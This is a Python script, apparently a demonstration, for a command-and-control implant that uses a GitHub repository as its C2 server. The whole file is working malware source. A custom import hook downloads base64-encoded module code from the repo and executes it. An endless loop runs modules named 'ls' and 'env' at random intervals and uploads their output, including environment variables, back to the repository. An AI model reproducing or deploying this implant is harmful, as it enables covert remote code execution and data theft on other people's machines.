#!/usr/bin/env python3

import random
import sys
import threading
import time
import github3
import base64
import importlib

from datetime import datetime

GITHUB_REPO = 'c2-demo'
GITHUB_USER = 'hacktheclown'
GITHUB_TOKEN = 'ghp_test'
C2_MODULES = ['ls', 'env']

def github_connect():
    print('Connecting to github ..')
    token = GITHUB_TOKEN
    session = github3.login(token=token)
    return session.repository(GITHUB_USER, GITHUB_REPO)

class Implant:
    def __init__(self, id, repo):
        self.id = id
        self.output_path = f'output/{id}'
        self.modules = C2_MODULES
        self.repo = repo

    def run_module(self, module):
        timestamp = datetime.now().isoformat()
        output = sys.modules[module].run()
        output_file = f'{self.output_path}/{module}/{timestamp}.out'
        self.repo.create_file(output_file, timestamp, output.encode('utf-8'))

    def run(self):
        while True:
            for module in self.modules:
                exec(f'import {module}')
                exec(f'importlib.reload({module})')
                print(f'Running module {module}...')
                t = threading.Thread(target=self.run_module, args=(module,))
                t.start()
                time.sleep(random.randint(1, 10))

class C2ModuleImporter:
    def __init__(self, repo_session):
        self.repo = repo_session
        self.module_code = ""

    def find_spec(self, name, path=None, target=None):
        print(f'Getting module {name} ...')
        module_content = self.repo.file_contents(f'modules/{name}.py').content
        self.module_code = base64.b64decode(module_content)
        spec = importlib.util.spec_from_loader(name, loader=self,
                                               origin=self.repo.git_url)
        return spec

    def exec_module(self, module):
        exec(self.module_code, module.__dict__)
        return None

    def create_module(self, spec):
        return None

if __name__ == '__main__':
    repo_session = github_connect()
    sys.meta_path.append(C2ModuleImporter(repo_session))
    implant = Implant('clown_implant', repo_session)
    implant.run()
